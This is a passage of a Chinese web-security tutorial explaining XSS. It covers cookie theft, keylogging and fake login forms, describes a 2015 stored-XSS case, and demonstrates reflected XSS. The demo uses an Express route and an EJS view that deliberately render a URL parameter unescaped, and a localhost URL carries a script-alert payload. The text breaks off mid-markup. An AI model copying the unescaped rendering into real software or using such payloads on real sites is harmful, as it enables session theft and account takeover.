XSS 攻击</h2>\n<p>XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。</p>\n<p>最开始的时候，这种攻击是通过跨域来实现的，所以叫“跨域脚本”。但是发展到现在，往 HTML 文件中注入恶意代码的方式越来越多了，所以是否跨域注入脚本已经不是唯一的注入手段了，但是 XSS 这个名字却一直保留至今。</p>\n<p>当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。下面我们就来看看，如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情</p>\n<ul>\n<li>可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。</li>\n<li>可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。</li>\n<li>可以通过修改 DOM 伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。</li>\n<li>还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。</li>\n</ul>\n<p>除了以上几种情况外，恶意脚本还能做很多其他的事情，这里就不一一介绍了。总之，如果让页面插入了恶意脚本，那么就相当于把我们页面的隐私数据和行为完全暴露给黑客了。</p>\n<h2 id="恶意脚本是怎么注入的"><a href="#%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E6%98%AF%E6%80%8E%E4%B9%88%E6%B3%A8%E5%85%A5%E7%9A%84" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>恶意脚本是怎么注入的</h2>\n<p>现在我们知道了页面中被注入恶意的 JavaScript 脚本是一件非常危险的事情，所以网站开发者会尽可能地避免页面中被注入恶意脚本。要想避免站点被注入恶意脚本，就要知道有哪些常见的注入方式。通常情况下，主要有存储型 XSS 攻击、反射型 XSS 攻击和基于 DOM 的 XSS 攻击三种方式来注入恶意脚本。</p>\n<h3 id="存储型-xss-攻击"><a href="#%E5%AD%98%E5%82%A8%E5%9E%8B-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>存储型 XSS 攻击</h3>\n<p>我们先来看看存储型 XSS 攻击是怎么向 HTML 文件中注入恶意脚本的，你可以参考下图</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-25-20-54a57fa819a705d540d2698134de9c9b-43c12.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 78.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsSAAALEgHS3X78AAACK0lEQVQoz5WTXWvTUBjH9z38Al75JcQpztKWbnjhCjrmdBvM4bUgeOGdF/oBxAsplnph1/qytUU73CyCzNIW0k2xSZssSZOTl56cpHn1yULXIvXtfxEezsnvefmfc2ayufzr8qfsq53mwdfAIh7WvYHuYz1w7CDwgz9q5szZ84t3H5+bXX3w8EngO+IxjzVNEgW515XoDoJAlg1CBEG0h0MA/JFCeGXzfubl2817jzK5gue7kiwPBhi+iqqpCpI5lvt2iI45tssMR/C4MjEwkmVdU52wz+nyLTMwDcIye9VqdXf3ffVDt9cL4eAfFFWzTHPp5nIskbgcn8sXt0IYGV6PRSwaOq5n27Z1IkKIYRjmSLDu2DbMcnttLbUwH0vGt4qFEP7Bk6M37yiKY/tKXxRomm63241Go16vUxTVarWazSZ4JkkSz/PrdzYSqVRsPrlTKYWwYniiMuwIg76EoDEwFhQVPA2i2HPdWq1WKpdLlTLN0OOZXcfWQs+c0yEjeSdyXTca2xnJtKwQhsVoA/5QVVXTNGiPYRiIoVUBzlcUOY6zQ4J8rpT2S9t728XeETXFbUgBVum6rigKJCIjwRYW+Rvpa+D27KULuWdPf4UnL0CUKCIxxjrG35uNleWlq+nFxEIyn8383zmTvnjrejqeiF+Zu1h48fzv8ORN9hybPvhyWNunPlYVuhMZNkVT+VAGDogBb86D4HeV4Q0ghCLnYPJxIqg/8VB/AtrWZAR38QhkAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 25 20" title="" data-src="/static/2021-07-15-14-25-20-54a57fa819a705d540d2698134de9c9b-fee1c.png" data-srcset="/static/2021-07-15-14-25-20-54a57fa819a705d540d2698134de9c9b-a67b7.png 200w,\n/static/2021-07-15-14-25-20-54a57fa819a705d540d2698134de9c9b-0b187.png 400w,\n/static/2021-07-15-14-25-20-54a57fa819a705d540d2698134de9c9b-fee1c.png 800w,\n/static/2021-07-15-14-25-20-54a57fa819a705d540d2698134de9c9b-b1a91.png 1200w,\n/static/2021-07-15-14-25-20-54a57fa819a705d540d2698134de9c9b-43c12.png 1500w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>通过上图，我们可以看出存储型 XSS 攻击大致需要经过如下步骤：</p>\n<ul>\n<li>首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；</li>\n<li>然后用户向网站请求包含了恶意 JavaScript 脚本的页面；</li>\n<li>当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。</li>\n</ul>\n<p>下面我们来看个例子，2015 年喜马拉雅就被曝出了存储型 XSS 漏洞。起因是在用户设置专辑名称时，服务器对关键字过滤不严格，比如可以将专辑名称设置为一段 JavaScript，如下图所示：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-25-47-cc9e48874499cd8b58a894b372b72463-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 80.99824868651488%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsSAAALEgHS3X78AAACZklEQVQoz41SzWsTQRTfKtKLF62iB4V68I8IIvTYo4h4LfhRRBEEBS05i1ClxV78uHjw41KkUky6UFrrR0lsssm2wWytTZuStUk/sp+zHzOzM+PsblsSPdQ3Px7De/N7vzePJ1gjvfrzi/bTXuP1NXOoBzzo3rx0MOgTyNUO2i949095ydPo1iGQ7Cb9nej6AfvuMXy707t3HN48LMDMW3/2DZwbhfn38NsrNDlCxMdYfIInBvHMC5R9h2ee2eOPtPFB68NDDkccRpND8OtLIA4LkLAdBKH3KfMY8xmDMUjoDY82ATF8akLKH2DGEGMAMyHwIYEohI9IQBg3yhihhMfjlA8pRAxh7inCO/EoKBBM4tecBWpKUcoV5+crlRW2r1HWRnbXf1VKheXyQm15MQBGAMwQTgjiWvGFR5Clc2DoROSISX7XtdnMZj7vKwqprJiyrEmSVig0pTxHI5ttShK/6MUCXPrplRZcudhCrqlbqXRVFO1sBsvy2kR6aWysmk6tpj6uT02tieLG9Kf69NTWl8+4VPJzc9737G7be+AWEMpHghCNUtD1aBBEn4zSXAnjEJS2kPmfXa+p6ZgnGFPKZTmXlaWc47oRhbbWbxsYjTo3dH21WvV9n0d6ziW6BOHsyaPlH0pIDtobpK3T3q0ZCYS1zicSRzqEMye6FGXx/8iUERLuCSE0OTDQd/nCnRtX1Joal9ufvPcfiqFmGBYA0IMA2K7jWIZlmzawAOILx/4h09CiDSUMIQhReHjDXLYVfyvHA2vU69r2dqzdqG84jsP758qqquqGEe6vDUzd1Jt6zPoDrCxcgsKIbNgAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 25 47" title="" data-src="/static/2021-07-15-14-25-47-cc9e48874499cd8b58a894b372b72463-fee1c.png" data-srcset="/static/2021-07-15-14-25-47-cc9e48874499cd8b58a894b372b72463-a67b7.png 200w,\n/static/2021-07-15-14-25-47-cc9e48874499cd8b58a894b372b72463-0b187.png 400w,\n/static/2021-07-15-14-25-47-cc9e48874499cd8b58a894b372b72463-fee1c.png 800w,\n/static/2021-07-15-14-25-47-cc9e48874499cd8b58a894b372b72463-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>当黑客将专辑名称设置为一段 JavaScript 代码并提交时，喜马拉雅的服务器会保存该段 JavaScript 代码到数据库中。然后当用户打开黑客设置的专辑时，这段代码就会在用户的页面里执行（如下图），这样就可以获取用户的 Cookie 等数据信息</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-26-05-85fe1e9026072e0220d46ce40c421c59-457a0.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 95.50561797752809%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsSAAALEgHS3X78AAADQElEQVQ4y5VTWWsTURQexRaFuoDUDRH1waXuUH3x2R+mj4qKIvgPBJe27qDiAipikyZpm6VZZjqTTJJJMpMms2TW5vPMTROjRtA7HM4599z7zVm+y4FWt9tlEi6tqSKyEEE8EUMsvkC+hv6Zv63hGLexNdg0DAOCwGN1tYCSxEOWi1BVlcU934fjuj/Fc+HT3nBSXB85CAKmX714jsN7d+D8kT24cu4QLh7djUvT03AJQO+Y0PQWLMeGYXegkm1Y5ijA7gDw6ewMxjgOk1s34cLeCRyc2IxTJ0/AdRwG4vgeArroeB7WTJ0ArT8BQ6MP+GxuFlsIcPe2cUzt34mJLRwunD0NhwA7rsMA9Y41sEdnyAB7vZh5/BjjBHhscgKXj+/HwV3jOD01xUo2CKhtGXDpbNjxsHR9dMk/ezhHPRwbH8OBPbtw5vAkTu7bjunzZ1nJpm2hRYA2gZtUvva3HjJnfZ0FSq9f493Va1j48B5LyUVkl+JYSSVZ3LQdyEqVsjRZlmHJ/kYiDIM+bsBBtgHY8xHYHz6SYf9GNhBVPJg0BK9Plb6w+z09ABwmN4ZJTGbgB5Rh71J/L/RHCfc76w2jjVRsAflMCqIoQm+38D+La7YNNFs6WkYHhulAaTSQjsWRnI8izYsoVetomzaLt0LN7HC6zkjhEjkZiWwR88s80kIZqTwPRZRRWMohKWtI8lXEKB7ny4iuSEjkZUQzEviaSWIwLdTNgc+lcqtI5gQoaxYygoTFTAGLyTykz98QW84isSJgOZVFgS+CL1WxWmlAqqrI8BJyYgn5YgUi+SuURLjHhWwJ+x0E60RUKrmuoqRoUD59oUxLqEkyGlIRpm4goMPhuVCv06VfpNvD4QbWxgRdelKVhobq1++Qkxm0KjLacon45v/bUH4Ze0gX+rtDgdr3CCpvP0JRW2jWVGiKCrNShUVDstUmjEoNel2DaxO5XR+e49H7DsIMe5xieoN/PmVp0Qt59TKCe28E3HwSw61HUdx6EMWdhxHcn5nH3dk0bswIuP2yiOtzAu48LTCb69N9mNgBvQa/rmCtsQYhXURmKQ0hy0MsiOCzBfA5HmUaRlkqk1TIF1CmmF6t4QexHGWed3jUmQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 26 05" title="" data-src="/static/2021-07-15-14-26-05-85fe1e9026072e0220d46ce40c421c59-fee1c.png" data-srcset="/static/2021-07-15-14-26-05-85fe1e9026072e0220d46ce40c421c59-a67b7.png 200w,\n/static/2021-07-15-14-26-05-85fe1e9026072e0220d46ce40c421c59-0b187.png 400w,\n/static/2021-07-15-14-26-05-85fe1e9026072e0220d46ce40c421c59-fee1c.png 800w,\n/static/2021-07-15-14-26-05-85fe1e9026072e0220d46ce40c421c59-457a0.png 1068w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>当用户打开黑客设置的专辑页面时，服务器也会将这段恶意 JavaScript 代码返回给用户，因此这段恶意脚本就在用户的页面中执行了。</p>\n<p>恶意脚本可以通过 XMLHttpRequest 或者 Fetch 将用户的 Cookie 数据上传到黑客的服务器，如下图所示：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 90.19264448336251%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABm0lEQVQ4y5WUbXOjIBSF8///XxUUBG2iEaOpvJpt1D2Yabeza3fSMwwfwIdzOV49hDD1OqhODddhXVcffF3Xl667Qm9vfd9jZRzHy+WyLURpPbZX56dfhyVqDSHcbjfA1pjkJSkKASzyw9WH0ClVn05Ng+kkpcD8/n6/z/Nh/dQSJ2dtVVXH40kpBbf2fA7et23Lcs45q5tGqW4Y+nnT37B3XghRypIXEM8yarTBKTlj56ax1o6jsdbhyR14CiGjNI4sIySlhACAM2ydc3rUqlXDMOzDwYeUpBnN8g9prePmsqxftazz/d+yfcizDAUXopBlSSl9wKDxQAx3jmMfRjyM5WUpEdvr8RUpWWPj5gZ8HbtwdEZmMIcQ2H7Zu3f2zhFCkC2ECydpgs74EZwyxgEj8yR5eWT7FIw7U0qKItKoPE2TJ+Hl4YyE0R+4LQ7AQcaYZ52nMG2dGMvOt8rtT+CAahG2lBIH8IKjw/5s/x++TVOFtywkeI4aGNParHv6trfLEi0CVfBHSz8Lo0kKIfBJgsRfAZ+u+d75N53sBDkL8MGlAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 26 30" title="" data-src="/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-fee1c.png" data-srcset="/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-a67b7.png 200w,\n/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-0b187.png 400w,\n/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-fee1c.png 800w,\n/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>黑客拿到了用户 Cookie 信息之后，就可以利用 Cookie 信息在其他机器上登录该用户的账号（如下图），并利用用户账号进行一些恶意操作。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-26-42-4e59ee616b0b62862c9dfcab00f8ce6a-6f7a7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 64.15620641562064%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsSAAALEgHS3X78AAAB2ElEQVQoz3VR70/TQBjuv2v4UzDGODV+8IMfQBLYSuIWURaITGEmBpFIlgBzYLe1W3vtde31frV3823PMSf65ul7Ty/vc+8vi3w/8DsbwecG6u6M7Zpff4jePA7evwjePQ9az6bNJ/7bmt+qTZu1kreehruPkL2OurbfO7FI/ys+a0cXnfBs3+800Ift8MSOvjRHh6+H7Q33cAt1dyef6n5nJziuB8cNZ++Ve7A5Pd0fnx9ZSimcMlno+arpCvdNLe6BWHAM+v2ry8u50iRJ4wjnIs9lXkjwsgBwkQuR8wWEzLmEmELqUmxv19cerDGScS5wFEkhOeeMMV4dnPGieusOuSwEzzlNS3FGSP/6h6lqNovdiRfhWAguhaCUUS7uF59LxbKJNVeK4JAybm4JSRHGKE4gpbiTKV1Cz5eorMycQqs4NkE0yyilaZpGkB3HWuk/MdeGmCeqnhllGcl+j/g/pk3m1WWYnrMkSUwE8NFo5HkurBBGff3t1PnpRGFkJM7N+e3gCooyegu+RUklmeGZ63pj100p1YK3N19e9HrQgEn78Wjv9mYgpVxm/ssKpbksl2J+YaOFUv/sZUUM4wAPqx4OHfAYY9fzgHuehxAqhwU16mXrvwAiZ9psInDk4wAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 26 42" title="" data-src="/static/2021-07-15-14-26-42-4e59ee616b0b62862c9dfcab00f8ce6a-fee1c.png" data-srcset="/static/2021-07-15-14-26-42-4e59ee616b0b62862c9dfcab00f8ce6a-a67b7.png 200w,\n/static/2021-07-15-14-26-42-4e59ee616b0b62862c9dfcab00f8ce6a-0b187.png 400w,\n/static/2021-07-15-14-26-42-4e59ee616b0b62862c9dfcab00f8ce6a-fee1c.png 800w,\n/static/2021-07-15-14-26-42-4e59ee616b0b62862c9dfcab00f8ce6a-b1a91.png 1200w,\n/static/2021-07-15-14-26-42-4e59ee616b0b62862c9dfcab00f8ce6a-6f7a7.png 1434w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>以上就是存储型 XSS 攻击的一个典型案例，这是乌云网在 2015 年曝出来的，虽然乌云网由于某些原因被关停了。</p>\n<h3 id="反射型-xss-攻击"><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>反射型 XSS 攻击</h3>\n<p>在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。</p>\n<p>这样讲有点抽象，下面我们结合一个简单的 Node 服务程序来看看什么是反射型 XSS。首先我们使用 Node 来搭建一个简单的页面环境，搭建好的服务代码如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="61645481811924840000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`var express = require(\'express\');\nvar router = express.Router();\n\n/* GET home page. */\nrouter.get(\'/\', function(req, res, next) {\n  res.render(\'index\', { title: \'Express\', xss: req.query.xss });\n});\n\nmodule.exports = router;`, `61645481811924840000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">\'express\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token comment">/* GET home page. */</span>\nrouter<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">\'/\'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">\'index\'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">\'Express\'</span><span class="token punctuation">,</span> xss<span class="token punctuation">:</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>xss <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\nmodule<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="86840597651705970000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<html>\n  <head>\n    <title><%= title %></title>\n    <link rel=&quot;stylesheet&quot; href=&quot;/stylesheets/style.css&quot; />\n  </head>\n  <body>\n    <h1><%= title %></h1>\n    <p>Welcome to <%= title %></p>\n    <div>\n      <%- xss %>\n    </div>\n  </body>\n</html>`, `86840597651705970000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>&lt;%= title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/stylesheets/style.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>&lt;%= title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Welcome to &lt;%= title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>\n      &lt;%- xss %>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>上面这两段代码，第一段是路由，第二段是视图，作用是将 URL 中 xss 参数的内容显示在页面。我们可以在本地演示下，比如打开 <code class="language-text">http://localhost:3000/?xss=123</code> 这个链接，这样在页面中展示就是“123”了（如下图），是正常的，没有问题的。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-29-27-ea71c697a01062c57399df008b1f546f-5e571.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 60.49382716049383%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsSAAALEgHS3X78AAABCUlEQVQoz2OYOGlydk5uXn5hWXlldk5eckpaSmp6alpGRmZ2SWl5c0tbVXVtcUl5SWlFaRkQgdQApeLiE1etXsMQERkjISmrpq6tqKSmrKympKQmKSUrLiEtKiYpIiopKSUnLiEjKiYFRwKCIoJCogyMrG3tnQxnzpzdsWPnnj17t+/YCWTs2rUbyNi+fce2bds3b96yadNmIImMtmzZunXb9g0bN928eYvhPwUApPn79++379y5d+/ekydP/hIN/v37B9L88+fPS5cuXblyFegSIJs0m3/9+vX+/fsfP39+AQPSNAPdAHQ5mX6GgH8wQLJmXHrwG0dxVGEFX79+fffu/du3b/EEBwDhDmPsnJkCjwAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 29 27" title="" data-src="/static/2021-07-15-14-29-27-ea71c697a01062c57399df008b1f546f-fee1c.png" data-srcset="/static/2021-07-15-14-29-27-ea71c697a01062c57399df008b1f546f-a67b7.png 200w,\n/static/2021-07-15-14-29-27-ea71c697a01062c57399df008b1f546f-0b187.png 400w,\n/static/2021-07-15-14-29-27-ea71c697a01062c57399df008b1f546f-fee1c.png 800w,\n/static/2021-07-15-14-29-27-ea71c697a01062c57399df008b1f546f-b1a91.png 1200w,\n/static/2021-07-15-14-29-27-ea71c697a01062c57399df008b1f546f-5e571.png 1458w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>但当打开 <code class="language-text">http://localhost:3000/?xss=&lt;script&gt;alert(&#39;你被xss攻击了&#39;)&lt;/script&gt;</code> 这段 URL 时，其结果如下图所示：</p>\n<p><html><head></head><body><a 